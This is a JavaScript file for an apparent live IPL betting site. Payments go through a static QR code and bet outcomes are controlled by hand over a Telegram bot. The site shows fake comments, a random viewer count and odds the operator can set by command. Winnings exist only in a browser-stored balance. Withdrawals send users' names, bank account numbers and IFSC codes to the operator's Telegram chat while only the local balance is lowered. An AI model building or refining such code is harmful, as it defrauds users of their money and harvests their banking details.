'use strict';

const S = {
    activeMatch: null,
    selectedTeam: null,
    betAmount: 0,
    currentBetId: null,
    userId: null,
    oddsTimer: null,
    oddsCountdown: null,
    oddsNextAt: null,
    pollQR: null,
    pollAccept: null,
    pollResult: null,
    qrRevealTimer: null,
    lastComments: [],
    countdownTimers: [],
    handledOddsUpdates: [],
    qrUpdateId: 0,
    acceptUpdateId: 0,
    resultUpdateId: 0
};

document.addEventListener('DOMContentLoaded', () => {
    S.userId = localStorage.getItem('uid') || (() => {
        const id = 'U' + Date.now() + Math.random().toString(36).slice(2, 7);
        localStorage.setItem('uid', id);
        return id;
    })();

    ensureDefaultBalance();
    pinLiveSections();
    buildMatchGrid();
    setupListeners();
    startCommentLoop();
    startResultPoll();
    setInterval(buildMatchGrid, 60_000);
    console.log('App ready - user:', S.userId);
});

function buildMatchGrid() {
    const grid = document.getElementById('matchGrid');
    const now = new Date();

    S.countdownTimers.forEach(timer => clearInterval(timer));
    S.countdownTimers = [];

    const list = MATCHES
        .map(match => ({ ...match, _start: new Date(match.startTime), _end: new Date(match.endTime) }))
        .filter(match => now < match._end)
        .sort((a, b) => {
            const aLive = now >= a._start ? 0 : 1;
            const bLive = now >= b._start ? 0 : 1;
            if (aLive !== bLive) return aLive - bLive;
            return a._start - b._start;
        });

    if (!list.length) {
        grid.innerHTML = '<p style="color:var(--text2);padding:1rem 0;">No upcoming IPL matches right now.</p>';
        hideBettingSection();
        return;
    }

    grid.innerHTML = list.map(match => {
        const live = now >= match._start;
        const dateLabel = match._start.toLocaleDateString('en-IN', {
            timeZone: 'Asia/Kolkata',
            weekday: 'short',
            day: 'numeric',
            month: 'short'
        });
        const timeLabel = match._start.toLocaleTimeString('en-IN', {
            timeZone: 'Asia/Kolkata',
            hour: '2-digit',
            minute: '2-digit'
        });

        return `
        <div class="match-card ${live ? 'is-live' : 'is-upcoming'}" onclick="${live ? `selectMatch('${match.id}')` : 'void(0)'}">
            <div class="match-card-left">
                <div class="match-card-league">IPL 2026 • Match ${match.matchNo || '-'}</div>
                <div class="match-card-teams">
                    <span>${match.team1.flag} ${match.team1.code}</span>
                    <span class="match-card-vs">vs</span>
                    <span>${match.team2.code} ${match.team2.flag}</span>
                </div>
                <div class="match-card-full">
                    ${match.team1.name} vs ${match.team2.name}
                </div>
                <div class="match-card-meta">
                    <span class="match-card-venue">${match.venue}</span>
                    <span class="match-card-time">${dateLabel}, ${timeLabel} IST</span>
                </div>
                ${!live ? `<div class="match-countdown" id="cd_${match.id}">Loading...</div>` : '<div class="match-countdown live-now">Betting unlocked</div>'}
            </div>
            <span class="match-badge ${live ? 'badge-live' : 'badge-upcoming'}">
                ${live ? 'LIVE' : 'Soon'}
            </span>
        </div>`;
    }).join('');

    list.filter(match => now < match._start).forEach(match => {
        const el = document.getElementById(`cd_${match.id}`);
        if (!el) return;

        const tick = () => {
            const diff = match._start - new Date();
            if (diff <= 0) {
                el.textContent = 'Starting now';
                buildMatchGrid();
                return;
            }

            const hours = Math.floor(diff / 3_600_000);
            const minutes = Math.floor((diff % 3_600_000) / 60_000);
            const seconds = Math.floor((diff % 60_000) / 1000);
            el.textContent = hours > 0
                ? `Starts in ${hours}h ${minutes}m`
                : `Starts in ${minutes}m ${seconds}s`;
        };

        tick();
        S.countdownTimers.push(setInterval(tick, 1000));
    });

    const firstLive = list.find(match => now >= match._start);
    if (firstLive && (!S.activeMatch || S.activeMatch.id !== firstLive.id)) {
        selectMatch(firstLive.id);
    }
}

function selectMatch(id) {
    const match = MATCHES.find(item => item.id === id);
    if (!match) return;

    if (new Date() < new Date(match.startTime)) {
        alert('Match has not started yet.');
        return;
    }

    S.activeMatch = match;

    if (!match.team1.odds || !match.team2.odds) {
        const nextOdds = freshOdds();
        match.team1.odds = nextOdds.a;
        match.team2.odds = nextOdds.b;
    }

    renderTeamCards();
    showBettingSection();
    scheduleNextOddsUpdate();
    resetBetForm();
    initCommentColors(match);
    document.getElementById('commentsSection').style.display = '';
    document.getElementById('heroSub').textContent =
        `${match.team1.flag} ${match.team1.code} vs ${match.team2.code} ${match.team2.flag} - LIVE at ${match.venue}`;
    pinLiveSections();
    scrollLiveToTop();
}

function renderTeamCards() {
    const match = S.activeMatch;
    if (!match) return;

    document.getElementById('bettingTitle').textContent =
        `${match.team1.flag} ${match.team1.name} vs ${match.team2.name} ${match.team2.flag}`;
    setTeamCard(1, match.team1);
    setTeamCard(2, match.team2);
    document.documentElement.style.setProperty('--t1-color', match.team1.color);
    document.documentElement.style.setProperty('--t2-color', match.team2.color);
}

function setTeamCard(index, team) {
    document.getElementById(`flag${index}`).textContent = team.flag;
    document.getElementById(`name${index}`).textContent = team.name;
    document.getElementById(`name${index}`).style.color = team.color;
    document.getElementById(`odds${index}`).innerHTML = `${team.odds}<span class="odds-x">X</span>`;
    document.getElementById(`odds${index}`).style.color = team.color;
    document.getElementById(`ex${index}`).innerHTML =
        `Bet Rs100 -> <strong>Rs${fmt(100 * team.odds)}</strong><br>` +
        `Bet Rs1K -> <strong>Rs${fmt(1000 * team.odds)}</strong>`;
}

function freshOdds() {
    const team1Fav = Math.random() < 0.5;
    const high = +randF(6.8, CONFIG.ODDS_MAXIMUM).toFixed(1);
    const low = +randF(CONFIG.ODDS_WHEN_MAX_LOW, CONFIG.ODDS_WHEN_MAX_HIGH).toFixed(1);
    return team1Fav ? { a: high, b: low } : { a: low, b: high };
}

function scheduleNextOddsUpdate() {
    if (S.oddsTimer) clearTimeout(S.oddsTimer);
    if (S.oddsCountdown) clearInterval(S.oddsCountdown);

    const mins = CONFIG.ODDS_MIN_MINUTES + Math.random() * (CONFIG.ODDS_MAX_MINUTES - CONFIG.ODDS_MIN_MINUTES);
    const ms = mins * 60_000;
    S.oddsNextAt = new Date(Date.now() + ms);

    S.oddsCountdown = setInterval(() => {
        const left = S.oddsNextAt - Date.now();
        if (left <= 0) {
            clearInterval(S.oddsCountdown);
            return;
        }

        const minutes = String(Math.floor(left / 60_000)).padStart(2, '0');
        const seconds = String(Math.floor((left % 60_000) / 1000)).padStart(2, '0');
        const countdown = document.getElementById('oddsCountdown');
        if (countdown) countdown.textContent = `${minutes}:${seconds}`;
    }, 1000);

    S.oddsTimer = setTimeout(() => {
        if (!S.activeMatch) return;

        const nextOdds = freshOdds();
        S.activeMatch.team1.odds = nextOdds.a;
        S.activeMatch.team2.odds = nextOdds.b;
        animateOdds();
        renderTeamCards();
        updatePotentialDisplay();
        scheduleNextOddsUpdate();
    }, ms);
}

function animateOdds() {
    ['odds1', 'odds2'].forEach(id => {
        const el = document.getElementById(id);
        if (!el) return;
        el.classList.remove('odds-pop');
        void el.offsetWidth;
        el.classList.add('odds-pop');
    });
}

function trackOddsUpdate(updateId) {
    if (S.handledOddsUpdates.includes(updateId)) return false;
    S.handledOddsUpdates.push(updateId);
    if (S.handledOddsUpdates.length > 100) S.handledOddsUpdates.shift();
    return true;
}

function parseManualOddsCommand(text) {
    if (!text) return null;
    const compact = text.toUpperCase().replace(/\s+/g, '');
    const match = compact.match(/([A-Z]{2,4})(\d{1,2}(?:\.\d+)?)X\b/);
    if (!match) return null;

    const odds = parseFloat(match[2]);
    if (!Number.isFinite(odds)) return null;

    return {
        code: match[1],
        odds: Math.min(CONFIG.MANUAL_ODDS_MAX, Math.max(CONFIG.MANUAL_ODDS_MIN, odds))
    };
}

function applyManualOdds(code, odds) {
    let applied = false;

    MATCHES.forEach(match => {
        let target = null;
        let other = null;

        if (match.team1.code === code) {
            target = match.team1;
            other = match.team2;
        } else if (match.team2.code === code) {
            target = match.team2;
            other = match.team1;
        }

        if (!target) return;

        target.odds = +odds.toFixed(1);
        if (other && target.odds >= 6) {
            other.odds = +randF(CONFIG.ODDS_WHEN_MAX_LOW, CONFIG.ODDS_WHEN_MAX_HIGH).toFixed(1);
        }
        applied = true;
    });

    if (applied && S.activeMatch && (S.activeMatch.team1.code === code || S.activeMatch.team2.code === code)) {
        animateOdds();
        renderTeamCards();
        updatePotentialDisplay();
    }

    return applied;
}

function handleManualOddsUpdates(updates) {
    updates.forEach(update => {
        if (!update || !update.update_id || !trackOddsUpdate(update.update_id)) return;
        const parsed = parseManualOddsCommand(update.message && update.message.text);
        if (!parsed) return;
        applyManualOdds(parsed.code, parsed.odds);
    });
}

function showBettingSection() {
    document.getElementById('bettingSection').style.display = '';
}

function hideBettingSection() {
    document.getElementById('bettingSection').style.display = 'none';
    document.getElementById('commentsSection').style.display = 'none';
}

function pinLiveSections() {
    const main = document.querySelector('.main');
    const betting = document.getElementById('bettingSection');
    const comments = document.getElementById('commentsSection');
    const schedule = document.getElementById('scheduleSection');
    if (!main || !betting || !comments || !schedule) return;

    if (main.firstElementChild !== betting) {
        main.insertBefore(betting, main.firstElementChild);
    }

    if (betting.nextElementSibling !== comments) {
        main.insertBefore(comments, schedule);
    }
}

function scrollLiveToTop() {
    const hero = document.querySelector('.hero');
    if (hero) {
        hero.scrollIntoView({ behavior: 'smooth', block: 'start' });
        return;
    }
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function setupListeners() {
    document.getElementById('card1').addEventListener('click', () => pickTeam('team1'));
    document.getElementById('card2').addEventListener('click', () => pickTeam('team2'));
    document.getElementById('amountInput').addEventListener('input', event => {
        S.betAmount = parseFloat(event.target.value) || 0;
        updatePotentialDisplay();
    });
    document.getElementById('btnPlace').addEventListener('click', onPlaceBet);
    document.getElementById('btnCancelPayment').addEventListener('click', closePaymentModal);
    document.getElementById('screenshotInput').addEventListener('change', onScreenshot);
    document.getElementById('btnConfirmPay').addEventListener('click', onConfirmPay);
    document.getElementById('btnTryAgain').addEventListener('click', () => {
        hide('modalRejected');
        resetBetForm();
    });
    document.getElementById('btnAccount').addEventListener('click', openAccount);
    document.getElementById('btnCloseAccount').addEventListener('click', () => hide('modalAccount'));
    document.querySelectorAll('.acc-tab').forEach(button => {
        button.addEventListener('click', () => {
            document.querySelectorAll('.acc-tab').forEach(item => item.classList.remove('active'));
            button.classList.add('active');
            const tab = button.dataset.tab;
            document.getElementById('paneHistory').classList.toggle('hidden', tab !== 'history');
            document.getElementById('paneWithdraw').classList.toggle('hidden', tab !== 'withdraw');
        });
    });
    document.getElementById('wAmount').addEventListener('input', event => {
        const value = parseFloat(event.target.value) || 0;
        document.getElementById('wSummary').classList.toggle('hidden', value < 100);
        document.getElementById('wSummaryAmt').textContent = `Rs${fmt(value)}`;
    });
    document.getElementById('btnWithdraw').addEventListener('click', onWithdraw);
}

function pickTeam(team) {
    if (!S.activeMatch) return;

    S.selectedTeam = team;
    document.getElementById('card1').classList.toggle('selected-t1', team === 'team1');
    document.getElementById('card2').classList.toggle('selected-t2', team === 'team2');
    document.getElementById('badge1').classList.toggle('hidden', team !== 'team1');
    document.getElementById('badge2').classList.toggle('hidden', team !== 'team2');

    const selected = team === 'team1' ? S.activeMatch.team1 : S.activeMatch.team2;
    const display = document.getElementById('selectedDisplay');
    display.textContent = `${selected.flag} ${selected.name}`;
    display.classList.add('active');
    display.style.color = selected.color;

    updatePotentialDisplay();
}

function updatePotentialDisplay() {
    const row = document.getElementById('potentialRow');
    const button = document.getElementById('btnPlace');
    if (S.selectedTeam && S.betAmount > 0) {
        const team = S.selectedTeam === 'team1' ? S.activeMatch.team1 : S.activeMatch.team2;
        const win = S.betAmount * team.odds;
        document.getElementById('potentialAmount').textContent = `Rs${fmt(win)}`;
        row.classList.remove('hidden');
        button.classList.remove('hidden');
        button.disabled = false;
    } else {
        row.classList.add('hidden');
        button.disabled = true;
    }
}

async function onPlaceBet() {
    if (!S.selectedTeam || S.betAmount <= 0 || !S.activeMatch) return;

    S.currentBetId = `BET${Date.now()}`;

    const match = S.activeMatch;
    const team = S.selectedTeam === 'team1' ? match.team1 : match.team2;
    const win = S.betAmount * team.odds;

    document.getElementById('payMatch').textContent = `${match.team1.name} vs ${match.team2.name}`;
    document.getElementById('payTeam').textContent = `${team.flag} ${team.name}`;
    document.getElementById('payAmount').textContent = `Rs${fmt(S.betAmount)}`;
    document.getElementById('payWin').textContent = `Rs${fmt(win)}`;

    hide('qrImage');
    show('qrPlaceholder');
    document.getElementById('screenshotSection').style.display = 'none';
    show('modalPayment');

    await tgSend(
        'NEW BET REQUEST\n\n' +
        `Bet ID: ${S.currentBetId}\n` +
        `Match: ${match.team1.name} vs ${match.team2.name}\n` +
        `Venue: ${match.venue}\n` +
        `Team: ${team.name}\n` +
        `Amount: Rs${fmt(S.betAmount)}\n` +
        `Win: Rs${fmt(win)}\n` +
        `Odds: ${team.odds}x\n` +
        `Time: ${istNow()}\n\n` +
        `Static payment QR opened for user.\n` +
        `Manual odds format: ${CONFIG.MANUAL_ODDS_FORMAT}`
    );

    if (S.qrRevealTimer) clearTimeout(S.qrRevealTimer);
    S.qrRevealTimer = setTimeout(() => {
        showQRInModal('payment-qr.jpeg');
        S.qrRevealTimer = null;
    }, rand(2000, 3000));
}

function startQRPoll() {
    if (S.pollQR) clearInterval(S.pollQR);

    S.pollQR = setInterval(async () => {
        const updates = await tgGetUpdates(S.qrUpdateId);
        handleManualOddsUpdates(updates);

        for (let i = updates.length - 1; i >= 0; i--) {
            const update = updates[i];
            const msg = update.message;
            if (!msg || !msg.photo) continue;

            const caption = (msg.caption || '').toUpperCase();
            if (!caption.includes(S.currentBetId.toUpperCase())) continue;

            const fileId = msg.photo[msg.photo.length - 1].file_id;
            const url = await tgGetFileUrl(fileId);
            if (!url) continue;

            clearInterval(S.pollQR);
            S.pollQR = null;
            S.qrUpdateId = update.update_id + 1;
            showQRInModal(url);
            break;
        }
    }, 3000);
}

function showQRInModal(url) {
    const img = document.getElementById('qrImage');
    img.src = url;
    img.classList.remove('hidden');
    hide('qrPlaceholder');
    document.getElementById('screenshotSection').style.display = '';
    document.getElementById('screenshotPreview').classList.add('hidden');
    document.getElementById('screenshotPreview').src = '';
    document.getElementById('screenshotPlaceholder').classList.remove('hidden');
    document.getElementById('screenshotInput').value = '';
}

function onScreenshot(event) {
    const file = event.target.files[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = loadEvent => {
        const preview = document.getElementById('screenshotPreview');
        preview.src = loadEvent.target.result;
        preview.classList.remove('hidden');
        document.getElementById('screenshotPlaceholder').classList.add('hidden');
    };
    reader.readAsDataURL(file);
}

async function onConfirmPay() {
    if (!S.activeMatch || !S.selectedTeam) return;

    const match = S.activeMatch;
    const team = S.selectedTeam === 'team1' ? match.team1 : match.team2;
    const win = S.betAmount * team.odds;

    const caption =
        'PAYMENT SUBMITTED\n\n' +
        `Bet ID: ${S.currentBetId}\n` +
        `Match: ${match.team1.name} vs ${match.team2.name}\n` +
        `Team: ${team.name}\n` +
        `Amount: Rs${fmt(S.betAmount)}\n` +
        `Win: Rs${fmt(win)}\n` +
        `Time: ${istNow()}\n\n` +
        `ACCEPT: ACCEPTED ${S.currentBetId}\n` +
        `REJECT: REJECTED ${S.currentBetId}`;

    const screenshotFile = document.getElementById('screenshotInput').files[0];
    if (screenshotFile) {
        const sent = await tgSendPhoto(screenshotFile, caption);
        await tgSend(`${caption}\n\nPHOTO STATUS: ${sent ? 'SCREENSHOT RECEIVED' : 'PHOTO FAILED - CHECK AGAIN'}`);
    } else {
        await tgSend(caption);
    }

    hide('modalPayment');
    document.getElementById('waitingBetId').textContent = S.currentBetId;
    show('modalWaiting');
    startAcceptPoll();
}

function closePaymentModal() {
    hide('modalPayment');
    if (S.qrRevealTimer) {
        clearTimeout(S.qrRevealTimer);
        S.qrRevealTimer = null;
    }
    if (S.pollQR) {
        clearInterval(S.pollQR);
        S.pollQR = null;
    }
}

function startAcceptPoll() {
    if (S.pollAccept) clearInterval(S.pollAccept);

    S.pollAccept = setInterval(async () => {
        const updates = await tgGetUpdates(S.acceptUpdateId);
        handleManualOddsUpdates(updates);

        for (let i = updates.length - 1; i >= 0; i--) {
            const update = updates[i];
            const msg = update.message;
            if (!msg || !msg.text) continue;

            const text = msg.text.toUpperCase();
            const betId = S.currentBetId.toUpperCase();
            if (text.includes('ACCEPTED') && text.includes(betId)) {
                clearInterval(S.pollAccept);
                S.pollAccept = null;
                S.acceptUpdateId = update.update_id + 1;
                onBetAccepted();
                return;
            }
            if (text.includes('REJECTED') && text.includes(betId)) {
                clearInterval(S.pollAccept);
                S.pollAccept = null;
                S.acceptUpdateId = update.update_id + 1;
                onBetRejected();
                return;
            }
        }
    }, 3000);
}

function onBetAccepted() {
    const match = S.activeMatch;
    const team = S.selectedTeam === 'team1' ? match.team1 : match.team2;
    const win = S.betAmount * team.odds;

    addBet({
        id: S.currentBetId,
        match: `${match.team1.name} vs ${match.team2.name}`,
        team: `${team.name} ${team.flag}`,
        amt: S.betAmount,
        win,
        odds: team.odds,
        ts: istNow(),
        status: 'accepted'
    });

    hide('modalWaiting');
    document.getElementById('accBetId').textContent = S.currentBetId;
    document.getElementById('accTeam').textContent = `${team.flag} ${team.name}`;
    document.getElementById('accAmount').textContent = `Rs${fmt(S.betAmount)}`;
    document.getElementById('accWin').textContent = `Rs${fmt(win)}`;
    const modal = document.getElementById('modalAccepted');
    const card = modal.querySelector('.modal-card');
    card.classList.remove('accept-animate');
    void card.offsetWidth;
    card.classList.add('accept-animate');
    show('modalAccepted');
    setTimeout(() => {
        hide('modalAccepted');
        card.classList.remove('accept-animate');
        resetBetForm();
    }, 6000);
}

function onBetRejected() {
    hide('modalWaiting');
    document.getElementById('rejBetId').textContent = S.currentBetId;
    show('modalRejected');
}

function startResultPoll() {
    S.pollResult = setInterval(async () => {
        const updates = await tgGetUpdates(S.resultUpdateId);
        handleManualOddsUpdates(updates);

        getBets().filter(bet => bet.status === 'accepted').forEach(bet => {
            for (let i = updates.length - 1; i >= 0; i--) {
                const update = updates[i];
                const msg = update.message;
                if (!msg || !msg.text) continue;

                const text = msg.text.toUpperCase();
                const betId = bet.id.toUpperCase();

                if (text.includes('WON') && text.includes(betId)) {
                    S.resultUpdateId = update.update_id + 1;
                    updateBetStatus(bet.id, 'won');
                    addBalance(bet.win);
                    alert(`You won Rs${fmt(bet.win)}.\nAdded to balance.`);
                }

                if (text.includes('LOST') && text.includes(betId)) {
                    S.resultUpdateId = update.update_id + 1;
                    updateBetStatus(bet.id, 'lost');
                }
            }
        });
    }, 5000);
}

function initCommentColors(match) {
    document.documentElement.style.setProperty('--t1-color', match.team1.color);
    document.documentElement.style.setProperty('--t2-color', match.team2.color);
}

function startCommentLoop() {
    [0, 1, 2].forEach(index => setTimeout(addComment, index * 700));
    setInterval(addComment, 10_000);
    const countEl = document.getElementById('liveCount');
    setInterval(() => {
        if (countEl) countEl.textContent = `${Math.floor(Math.random() * 80) + 120} watching`;
    }, 8000);
}

function addComment() {
    let available = COMMENTS.filter(comment => !S.lastComments.includes(comment.user));
    if (!available.length) {
        S.lastComments = [];
        available = COMMENTS;
    }

    const comment = available[Math.floor(Math.random() * available.length)];
    S.lastComments.push(comment.user);
    if (S.lastComments.length > 6) S.lastComments.shift();

    const box = document.getElementById('commentsBox');
    if (!box) return;

    const el = document.createElement('div');
    el.className = `comment-item ${comment.team}`;
    el.innerHTML = `
        <div class="comment-avatar">${comment.user[0]}</div>
        <div class="comment-body">
            <div class="comment-meta">
                <span class="comment-user">${comment.user}</span>
                <span class="comment-time">just now</span>
            </div>
            <div class="comment-text">${comment.text}</div>
        </div>`;

    box.insertBefore(el, box.firstChild);
    const all = box.querySelectorAll('.comment-item');
    if (all.length > 12) all[all.length - 1].remove();
}

function openAccount() {
    renderHistory();
    document.getElementById('balanceDisplay').textContent = `Rs${fmt(getBalance())}`;
    show('modalAccount');
}

function renderHistory() {
    const list = document.getElementById('historyList');
    const bets = getBets();
    if (!bets.length) {
        list.innerHTML = '<p class="empty-msg">No bets placed yet</p>';
        return;
    }

    list.innerHTML = bets.map(bet => {
        const cls = `status-${bet.status}`;
        const labelMap = {
            accepted: 'Accepted',
            won: 'Won',
            lost: 'Lost',
            pending: 'Pending',
            rejected: 'Rejected'
        };

        return `<div class="history-item">
            <div class="history-item-header">
                <span class="history-item-id">${bet.id}</span>
                <span class="status-badge ${cls}">${labelMap[bet.status] || bet.status}</span>
            </div>
            <div class="history-detail">
                <strong>${bet.match}</strong><br>
                Team: <strong>${bet.team}</strong> &nbsp;|&nbsp;
                Bet: <strong>Rs${fmt(bet.amt)}</strong> &nbsp;|&nbsp;
                To win: <strong>Rs${fmt(bet.win)}</strong><br>
                <span style="font-size:0.75rem;color:var(--text2)">${bet.ts}</span>
            </div>
        </div>`;
    }).join('');
}

async function onWithdraw() {
    const amt = parseFloat(document.getElementById('wAmount').value) || 0;
    const name = document.getElementById('wName').value.trim();
    const acc = document.getElementById('wAccNo').value.trim();
    const ifsc = document.getElementById('wIfsc').value.trim().toUpperCase();
    const bank = document.getElementById('wBank').value.trim();
    const bal = getBalance();

    if (amt < 100) return alert('Minimum withdrawal is Rs100');
    if (amt > bal) return alert(`Insufficient balance.\nBalance: Rs${fmt(bal)}`);
    if (!name || !acc || !ifsc || !bank) return alert('Fill all bank details');
    if (acc.length < 9) return alert('Invalid account number');
    if (ifsc.length !== 11) return alert('Invalid IFSC code');

    deductBalance(amt);
    await tgSend(
        'WITHDRAWAL\n\n' +
        `User: ${S.userId}\n` +
        `Amt: Rs${fmt(amt)}\n` +
        `Name: ${name}\n` +
        `Acc: ${acc}\n` +
        `IFSC: ${ifsc}\n` +
        `Bank: ${bank}\n` +
        `Time: ${istNow()}`
    );

    hide('modalAccount');
    document.getElementById('wdAmount').textContent = `Rs${fmt(amt)}`;
    document.getElementById('wdAcc').textContent = acc;
    document.getElementById('wdIfsc').textContent = ifsc;
    show('modalWdSuccess');
    setTimeout(() => hide('modalWdSuccess'), 5000);
}

function resetBetForm() {
    S.selectedTeam = null;
    S.betAmount = 0;
    S.currentBetId = null;
    document.getElementById('amountInput').value = '';
    const display = document.getElementById('selectedDisplay');
    display.textContent = '- no team selected -';
    display.classList.remove('active');
    display.style.color = '';
    document.getElementById('potentialRow').classList.add('hidden');
    document.getElementById('btnPlace').classList.add('hidden');
    document.getElementById('card1').classList.remove('selected-t1');
    document.getElementById('card2').classList.remove('selected-t2');
    document.getElementById('badge1').classList.add('hidden');
    document.getElementById('badge2').classList.add('hidden');
}

function ensureDefaultBalance() {
    const key = `bal_${S.userId}`;
    if (!localStorage.getItem(key)) localStorage.setItem(key, '5000.00');
}

function getBalance() {
    return parseFloat(localStorage.getItem(`bal_${S.userId}`) || '0');
}

function addBalance(amount) {
    localStorage.setItem(`bal_${S.userId}`, (getBalance() + amount).toFixed(2));
}

function deductBalance(amount) {
    localStorage.setItem(`bal_${S.userId}`, Math.max(0, getBalance() - amount).toFixed(2));
}

function getBets() {
    return JSON.parse(localStorage.getItem(`bets_${S.userId}`) || '[]');
}

function addBet(bet) {
    const bets = getBets();
    bets.unshift(bet);
    localStorage.setItem(`bets_${S.userId}`, JSON.stringify(bets));
}

function updateBetStatus(id, status) {
    const bets = getBets();
    const bet = bets.find(item => item.id === id);
    if (!bet) return;
    bet.status = status;
    localStorage.setItem(`bets_${S.userId}`, JSON.stringify(bets));
}

async function tgSend(text) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.TELEGRAM_CHAT_ID, text })
        });
        const data = await response.json();
        if (!data.ok) console.error('Telegram error:', data);
        return data.ok;
    } catch (error) {
        console.error('Telegram failure:', error);
        return false;
    }
}

async function tgSendPhoto(file, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
        formData.append('photo', file, file.name || 'screenshot.jpg');
        formData.append('caption', caption);

        const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        const data = await response.json();
        if (!data.ok) {
            console.error('Telegram photo error:', data);
            const docSent = await tgSendDocument(file, caption);
            if (!docSent) await tgSend(caption);
        }
        return data.ok;
    } catch (error) {
        console.error('Telegram photo failure:', error);
        const docSent = await tgSendDocument(file, caption);
        if (!docSent) await tgSend(caption);
        return false;
    }
}

async function tgSendDocument(file, caption) {
    try {
        const formData = new FormData();
        formData.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
        formData.append('document', file, file.name || 'payment-proof.jpg');
        formData.append('caption', caption);

        const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
        const data = await response.json();
        if (!data.ok) console.error('Telegram document error:', data);
        return data.ok;
    } catch (error) {
        console.error('Telegram document failure:', error);
        return false;
    }
}

async function tgGetUpdates(offset) {
    try {
        const query = Number.isFinite(offset) && offset > 0 ? `?offset=${offset}` : '';
        const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/getUpdates${query}`);
        const data = await response.json();
        return data.ok ? data.result : [];
    } catch (error) {
        console.error('Telegram updates failure:', error);
        return [];
    }
}

async function tgGetFileUrl(fileId) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`);
        const data = await response.json();
        if (!data.ok) return null;
        return `https://api.telegram.org/file/bot${CONFIG.TELEGRAM_BOT_TOKEN}/${data.result.file_path}`;
    } catch (error) {
        console.error('Telegram file failure:', error);
        return null;
    }
}

function rand(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randF(min, max) {
    return Math.random() * (max - min) + min;
}

function fmt(value) {
    return Number(value).toLocaleString('en-IN');
}

function istNow() {
    return new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
}

function show(id) {
    document.getElementById(id).classList.remove('hidden');
}

function hide(id) {
    document.getElementById(id).classList.add('hidden');
}
